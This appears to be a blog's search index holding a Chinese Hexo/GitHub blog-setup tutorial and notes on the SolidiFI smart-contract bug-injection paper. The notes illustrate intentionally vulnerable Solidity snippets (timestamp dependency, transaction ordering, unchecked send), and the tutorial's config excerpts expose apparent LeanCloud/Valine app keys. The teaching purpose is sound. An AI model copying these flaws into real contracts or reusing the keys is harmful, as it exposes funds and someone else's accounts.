<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hexo + Github 搭建博客</title>
    <link href="/2021/04bd7e40d4.html"/>
    <url>/2021/04bd7e40d4.html</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h1><blockquote><p><a href="https://hexo.io/zh-cn/docs/">Hexo 文档 </a></p></blockquote><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h2 id="Hexo-安装"><a href="#Hexo-安装" class="headerlink" title="Hexo 安装"></a>Hexo 安装</h2><h3 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h3><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li></ul><p>检测是否成功安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 Node.js 版本</span><br>$ node -v<br>v10.21.0<br><br><span class="hljs-comment"># 查看 Git 版本</span><br>$ git version<br>git version 2.29.1.windows.1<br></code></pre></td></tr></table></figure><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407152304.png" alt="image-20210407152257558"></p><h3 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h3><p>对于熟悉 npm 的进阶用户，可以仅局部安装 <code>hexo</code> 包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install hexo<br></code></pre></td></tr></table></figure><p>安装以后，可以使用以下两种方式执行 Hexo：</p><ol><li><code>npx hexo &lt;command&gt;</code></li><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27;</span> &gt;&gt; ~/.profile<br></code></pre></td></tr></table></figure><h2 id="Hexo-简易使用"><a href="#Hexo-简易使用" class="headerlink" title="Hexo 简易使用"></a>Hexo 简易使用</h2><h3 id="快速建站"><a href="#快速建站" class="headerlink" title="快速建站"></a>快速建站</h3><h4 id="1、指定文件夹"><a href="#1、指定文件夹" class="headerlink" title="1、指定文件夹"></a>1、指定文件夹</h4><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo init &lt;folder&gt;<br>$ <span class="hljs-built_in">cd</span> &lt;folder&gt;<br>$ npm install<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407152805.png" alt="image-20210407152805221"></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── <span class="hljs-built_in">source</span><br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br></code></pre></td></tr></table></figure><h4 id="2、建立网址"><a href="#2、建立网址" class="headerlink" title="2、建立网址"></a>2、建立网址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407153512.png" alt="image-20210407153512373"></p><p>会多出一个public的文件</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407153539.png" alt="image-20210407153539086"></p><h4 id="3、启动服务器"><a href="#3、启动服务器" class="headerlink" title="3、启动服务器"></a>3、启动服务器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407153615.png" alt="image-20210407153615669"></p><h4 id="4、访问网页"><a href="#4、访问网页" class="headerlink" title="4、访问网页"></a>4、访问网页</h4><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407153645.png" alt="image-20210407153644873"></p><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><h4 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h4><p>执行下列命令来创建一篇新文章或者新的页面。</p><ul><li>可以在命令中指定文章的布局（layout），默认为 <code>post</code></li><li>可以通过修改 <code>_config.yml</code> 中的 <code>default_layout</code> 参数来指定默认布局。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new [layout] &lt;title&gt;<br></code></pre></td></tr></table></figure><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210407154151.png" alt="image-20210407154151451"></p><p>会 <code>\source\_posts</code> 下生成一篇文章</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: 第一篇文章<br>date: 2021-04-07 15:41:18<br>tags:<br>---<br><br></code></pre></td></tr></table></figure><h4 id="重新生成网页"><a href="#重新生成网页" class="headerlink" title="重新生成网页"></a>重新生成网页</h4><ol><li>生成网页</li><li>运行服务器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g<br>$ hexo s<br></code></pre></td></tr></table></figure><h2 id="Hexo-域名管理"><a href="#Hexo-域名管理" class="headerlink" title="Hexo 域名管理"></a>Hexo 域名管理</h2><blockquote><p><a href="https://dc.console.aliyun.com/next/index?spm=5176.12818093.favorite.ddomain.5adc16d0KPMqNR#/domain/list/all-domain">阿里域名控制台</a></p></blockquote><h3 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h3><h4 id="阿里云解析"><a href="#阿里云解析" class="headerlink" title="阿里云解析"></a>阿里云解析</h4><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408115433.png" alt="image-20210408115433164"></p><p>添加两条解析</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408115709.png" alt="image-20210408115708992"></p><h4 id="Github-配置"><a href="#Github-配置" class="headerlink" title="Github 配置"></a>Github 配置</h4><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408115630.png" alt="image-20210408115630741"></p><h2 id="Hexo-主题配置"><a href="#Hexo-主题配置" class="headerlink" title="Hexo 主题配置"></a>Hexo 主题配置</h2><blockquote><p>主题：<a href="https://github.com/fluid-dev/hexo-theme-fluid">hexo-theme-fluid</a><br>配置指南：<a href="https://hexo.fluid-dev.com/docs/">Hexo Fluid</a></p></blockquote><p>主题配置起来还是挺麻烦，不过官方教程写的比较详细，不明白的地方再多看看其他人的配置文章，基本上就可以了。</p><h3 id="1、网页访问统计"><a href="#1、网页访问统计" class="headerlink" title="1、网页访问统计"></a>1、网页访问统计</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 网页访问统计</span><br><span class="hljs-comment"># Analysis of website visitors</span><br><span class="hljs-attr">web_analytics:</span>  <span class="hljs-comment"># 网页访问统计</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-comment"># 百度统计的 Key，值需要获取下方链接中 `hm.js?` 后边的字符串</span><br>  <span class="hljs-comment"># See: https://tongji.baidu.com/sc-web/10000033910/home/site/getjs?siteId=13751376</span><br>  <span class="hljs-attr">baidu:</span> <span class="hljs-string">ee358a24a3d27e65fdc3801fa166e19a</span><br>    <br>    <span class="hljs-comment"># LeanCloud 计数统计，可用于 PV UV 展示，如果 `web_analytics: enable` 没有开启，PV UV 展示只会查询不会增加</span><br>    <span class="hljs-attr">leancloud:</span><br>    <span class="hljs-attr">app_id:</span> <span class="hljs-string">aAmqsr4YuWrtrQmYt7oJIgRW-gzGzoHsz</span><br>    <span class="hljs-attr">app_key:</span> <span class="hljs-string">Y7jgoCiJCgvS7HIg2H1r4BDv</span><br>    <span class="hljs-comment"># REST API 服务器地址，国际版不填</span><br>    <span class="hljs-comment"># Only the Chinese mainland users need to set</span><br>    <span class="hljs-attr">server_url:</span> <span class="hljs-string">https://aamqsr4y.lc-cn-n1-shared.com</span><br></code></pre></td></tr></table></figure><h3 id="2、-评论插件"><a href="#2、-评论插件" class="headerlink" title="2、 评论插件"></a>2、 评论插件</h3><ul><li>首先需要指定开启</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 评论插件</span><br><span class="hljs-comment"># Comment plugin</span><br><span class="hljs-attr">comments:</span><br><span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br><span class="hljs-comment"># 指定的插件，需要同时设置对应插件的必要参数</span><br><span class="hljs-comment"># Options: utterances | disqus | gitalk | valine | waline | changyan | livere | remark42 | twikoo</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">valine</span><br></code></pre></td></tr></table></figure><p>再配置下面的部分</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Valine</span><br><span class="hljs-comment"># 基于 LeanCloud</span><br><span class="hljs-comment"># Based on LeanCloud</span><br><span class="hljs-comment"># See: https://valine.js.org/configuration.html</span><br><span class="hljs-attr">valine:</span><br>  <span class="hljs-attr">appid:</span> <span class="hljs-string">73Hj5P4VcTv8HBdu8NBByx0A-gzGzoHsz</span><br>  <span class="hljs-attr">appkey:</span> <span class="hljs-string">RiIo7kMzIb3EGAwRhvg7YEQ2</span><br>  <span class="hljs-attr">placeholder:</span> <span class="hljs-string">说点什么</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">window.location.pathname</span><br>  <span class="hljs-attr">avatar:</span> <span class="hljs-string">retro</span><br>  <span class="hljs-attr">meta:</span> [<span class="hljs-string">&#x27;nick&#x27;</span>, <span class="hljs-string">&#x27;mail&#x27;</span>, <span class="hljs-string">&#x27;link&#x27;</span>]<br>  <span class="hljs-attr">pageSize:</span> <span class="hljs-number">10</span><br>  <span class="hljs-attr">lang:</span> <span class="hljs-string">zh-CN</span><br>  <span class="hljs-attr">highlight:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">recordIP:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">serverURLs:</span> <br></code></pre></td></tr></table></figure><h2 id="百度和谷歌收录博客"><a href="#百度和谷歌收录博客" class="headerlink" title="百度和谷歌收录博客"></a>百度和谷歌收录博客</h2><blockquote><p><a href="http://duansm.top/2018/08/08/hexo-sitemap/">百度和谷歌收录博客</a></p><p><a href="https://segmentfault.com/a/1190000037550362">怎么样让自己的博客被谷歌和百度收录</a></p></blockquote><h3 id="百度收录"><a href="#百度收录" class="headerlink" title="百度收录"></a>百度收录</h3><blockquote><p><a href="https://ziyuan.baidu.com/site/index#/">百度站点管理</a></p></blockquote><p>需要登录<a href="https://ziyuan.baidu.com/">百度搜索资源平台</a>， 只要是百度旗下的账号就可以， 登录成功之后在站点管理中点击<a href="https://ziyuan.baidu.com/site/siteadd#/">添加网站</a>，输入域名，按照步骤走。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408120056.png" alt="image-20210408120055995"></p><p>需要验证网站的所有权，验证网站所有权的方式有三种</p><h4 id="CNAME解析验证"><a href="#CNAME解析验证" class="headerlink" title="CNAME解析验证"></a>CNAME解析验证</h4><p>需要到域名供应商后台管理新增一条域名解析，以阿里云的域名解析为例：</p><ul><li>请将code-k8gqscg2Wk.reanon.top使用CNAME解析到ziyuan.baidu.com</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408120419.png" alt="image-20210408120419056"></p><h4 id="推送网站的资源"><a href="#推送网站的资源" class="headerlink" title="推送网站的资源"></a>推送网站的资源</h4><p>百度已经知道有我们网站的存在了，但是百度还不知道我们的网站上有什么内容，所以要向百度推送我们的内容。</p><p>需要使用npm自动生成网站的sitemap，然后将生成的sitemap提交到百度和其他搜索引擎。</p><ul><li>sitemap是一种文件，您可以通过该文件列出您网站上的网页，从而将您网站内容的组织架构告知Google和其他搜索引擎。</li><li>Googlebot等搜索引擎网页抓取工具会读取此文件，以便更加智能地抓取您的网站。</li></ul><p>使用sitemap方式推送：需要先安装sitemap插件</p><h5 id="sitemap插件"><a href="#sitemap插件" class="headerlink" title="sitemap插件"></a>sitemap插件</h5><p>安装插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install hexo-generator-sitemap --save<br>$ npm install hexo-generator-baidu-sitemap –-save<br></code></pre></td></tr></table></figure><p>编辑博客配置文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim _config.yml<br></code></pre></td></tr></table></figure><p>在文件最后添加以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 自动生成sitemap</span><br><span class="hljs-attr">sitemap:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">sitemap.xml</span><br><span class="hljs-attr">baidusitemap:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">baidusitemap.xml</span><br></code></pre></td></tr></table></figure><h5 id="hexo-abbrlink"><a href="#hexo-abbrlink" class="headerlink" title="hexo-abbrlink"></a>hexo-abbrlink</h5><p>hexo-abbrlink是一个hexo博客链接永久化的解决方案。它可以支持使用不同的算法和进制对文章链接进行转换。</p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-abbrlink --save<br></code></pre></td></tr></table></figure><p>使用<br>打开config.yml，修改permalink中类似这样</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month:abbrlink.html</span><br><span class="hljs-attr">abbrlink:</span> <br>  <span class="hljs-attr">alg:</span> <span class="hljs-string">crc32</span> <span class="hljs-comment">#算法选项：crc16丨crc32</span><br>  <span class="hljs-attr">rep:</span> <span class="hljs-string">hex</span> <span class="hljs-comment">#输出进制：dec为十进制，hex为十六进制</span><br></code></pre></td></tr></table></figure><p>然后执行hexo clean &amp;&amp; hexo g 命令 我们可以发现永久链接生成如下。</p><p>保存文件，重新部署博客，查看：reanon.top/sitemap.xml。显示如下信息表示sitemap生成成功</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408121652.png" alt="image-20210408121651960"></p><h4 id="资源提交"><a href="#资源提交" class="headerlink" title="资源提交"></a>资源提交</h4><p>至此百度提交就完成了</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210408122018.png" alt="image-20210408122017974"></p><h3 id="谷歌收录"><a href="#谷歌收录" class="headerlink" title="谷歌收录"></a>谷歌收录</h3><blockquote><p><a href="https://search.google.com/search-console/welcome">Google Search Console</a></p></blockquote><h2 id="Hexo-配置文件"><a href="#Hexo-配置文件" class="headerlink" title="Hexo 配置文件"></a>Hexo 配置文件</h2><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration">配置</a> 信息，您可以在此配置大部分的参数。</p><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>应用程序的信息。<a href="https://ejs.co/">EJS</a>, <a href="http://learnboost.github.io/stylus/">Stylus</a> 和 <a href="http://daringfireball.net/projects/markdown/">Markdown</a> renderer 已默认安装，您可以自由移除。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">package.json&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hexo-site&quot;</span>,<br>  <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.0.0&quot;</span>,<br>  <span class="hljs-string">&quot;private&quot;</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-string">&quot;hexo&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;dependencies&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;hexo&quot;</span>: <span class="hljs-string">&quot;^3.8.0&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-generator-archive&quot;</span>: <span class="hljs-string">&quot;^0.1.5&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-generator-category&quot;</span>: <span class="hljs-string">&quot;^0.1.3&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-generator-index&quot;</span>: <span class="hljs-string">&quot;^0.2.1&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-generator-tag&quot;</span>: <span class="hljs-string">&quot;^0.2.0&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-renderer-ejs&quot;</span>: <span class="hljs-string">&quot;^0.3.1&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-renderer-stylus&quot;</span>: <span class="hljs-string">&quot;^0.3.3&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-renderer-marked&quot;</span>: <span class="hljs-string">&quot;^0.3.2&quot;</span>,<br>    <span class="hljs-string">&quot;hexo-server&quot;</span>: <span class="hljs-string">&quot;^0.3.3&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scaffolds"><a href="#scaffolds" class="headerlink" title="scaffolds"></a>scaffolds</h3><p><a href="https://hexo.io/zh-cn/docs/writing">模版</a> 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p><h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p><a href="https://hexo.io/zh-cn/docs/themes">主题</a> 文件夹。Hexo 会根据主题来生成静态页面。</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h3><p>使用 Hexo 生成静态文件快速而且简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><h3 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h3><p>Hexo 能够监视文件变动并立即重新生成静态文件，在生成时会比对文件的 SHA1 checksum，只有变动的文件才会写入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate --watch<br></code></pre></td></tr></table></figure><h3 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h3><p>您可执行下列的其中一个命令，让 Hexo 在生成完毕后自动部署网站，两个命令的作用是相同的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate --deploy<br>$ hexo deploy --generate<br></code></pre></td></tr></table></figure><p>上面两个命令可以简写为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g -d<br>$ hexo d -g<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>使用教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Evaluating Smart Contract Static Analysis Tools Using Bug Injection</title>
    <link href="/2020/125ff8d3f9.html"/>
    <url>/2020/125ff8d3f9.html</url>
    
    <content type="html"><![CDATA[<h1 id="SolidiFI"><a href="#SolidiFI" class="headerlink" title="SolidiFI"></a>SolidiFI</h1><p>论文题目：(2020-ISSTA) <a href="https://arxiv.org/abs/2005.11613">How Effective are Smart Contract Analysis Tools? Evaluating Smart Contract Static Analysis Tools Using Bug Injection</a></p><p>论文引用：Ghaleb A, Pattabiraman K. How Effective are Smart Contract Analysis Tools? Evaluating Smart Contract Static Analysis Tools Using Bug Injection[J]. arXiv preprint arXiv:2005.11613, 2020.</p><hr><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>本研究的主要目标是建立一种系统的方法来评估检测智能合约的静态分析，关键思想是将漏洞注入到智能合约源代码中的所有有效位置。本文提出了SolidiFI用于评估智能合约静态分析工具的自动化系统方法。 SolidiFI基于将 Bugs（即代码缺陷）注入到智能合约的所有潜在位置中以引入针对性的安全漏洞。然SolidiFI使用静态分析工具检查生成的合同，并识别工具无法检测到的错误（假阴性，False negatives，FN）和假阳性（FP，false positives）的错误。 SolidiFI评估了六个广泛使用的静态分析工具，即Oyente，Securify，Mythril，SmartCheck，Manticore和Slither，使用了9369个不同的漏洞注入的==50个合同==。</p><h3 id="智能合约背景"><a href="#智能合约背景" class="headerlink" title="智能合约背景"></a>智能合约背景</h3><p>智能合约的理论一旦部署在区块链上实际上就无法更新，并且Etherscan上的交易是一成不变的，此外，智能合约的丰厚的利益回报还为攻击者提供了诱因，使攻击者可以针对智能合约寻找漏洞。<br>针对智能合约的攻击事件以及这些攻击导致价值数百万美元的损失，因此实际上需要对智能合约进行分析以发现错误并进行修复，然后再部署到区块链上，当然已经提出了这样的工具使开发人员能够发现智能合约中的安全漏洞，不幸的是，这些工具不影响安全智能合约的部署，没有这样的系统性方法或方法可以用来评估此功能的有效性。（<a href="https://applicature.com/blog/blockchain-technology/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes">以太坊安全漏洞，黑客及其修复的历史</a>）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pragma solidity &gt;=<span class="hljs-number">0.4</span><span class="hljs-number">.21</span> &lt;<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;<br>contract EGame &#123;<br>address payable private winner ;<br>uint startTime ;<br><br><span class="hljs-title">constructor</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> &#123;<br>winner = msg . sender ;<br>startTime = block . timestamp ; <span class="hljs-comment">// timestamp dependency bug</span><br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span> (<span class="hljs-params"> bytes32 guess </span>) <span class="hljs-title">public</span> </span>&#123;<br><span class="hljs-keyword">if</span>( keccak256 (abi.encode(guess)) ==keccak256 (abi.encode (<span class="hljs-string">&#x27;solution &#x27;</span>)))&#123;<br><span class="hljs-keyword">if</span> ( startTime + (<span class="hljs-number">5</span> * <span class="hljs-number">1</span> days ) == block . timestamp)&#123; <span class="hljs-comment">// timestamp dependency bug</span><br>winner = msg.sender ;&#125;&#125;&#125;<span class="hljs-comment">// transaction ordering dependence(TOD)</span><br>   <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReward</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> <span class="hljs-title">public</span> </span>&#123;<br>winner.transfer ( msg.value );&#125;<span class="hljs-comment">// TOD</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><h4 id="Timestamp-dependency"><a href="#Timestamp-dependency" class="headerlink" title="Timestamp dependency"></a>Timestamp dependency</h4><p>合同可以使用该块的当前时间戳来触发一些与时间有关的事件。考虑到以太坊的分散性，矿工可以（在某种程度上）更改时间戳。恶意矿工可以使用此功能并更改时间戳以使自己满意。<br>该漏洞已在==GoverMental Ponzi计划==攻击中被利用。因此，开发人员不应依赖该块时间戳的精度。图4显示了代表该错误的代码段示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bug_tmstmp</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"> bool </span>)</span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-keyword">return</span> block.timestamp &gt;= <span class="hljs-number">1546300</span>;<span class="hljs-comment">// Timestamp dependency</span><br>&#125;<br></code></pre></td></tr></table></figure><center>Timestamp dependency examples.</center><h4 id="Unhandled-exceptions"><a href="#Unhandled-exceptions" class="headerlink" title="Unhandled exceptions"></a>Unhandled exceptions</h4><p>在以太坊中，合约可以相互调用，并相互发送以太币（例如，send指令，call指令等）。如果被调合约抛出了异常（例如，执行所需的限制气体），则合同终止，其状态恢复，并且将false返回给调用合同。<br>因此，调用合同中未经检查的返回值可用于攻击合同，从而导致不良行为。此漏洞的严重版本出现在==”King of the Ether”== 中。下图显示了一个示例（send()指令要求检查其返回值是否存在异常以确保其安全性）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unhandledsend</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br>    callee.send(<span class="hljs-number">5</span> ether);<span class="hljs-comment">// Unhandled 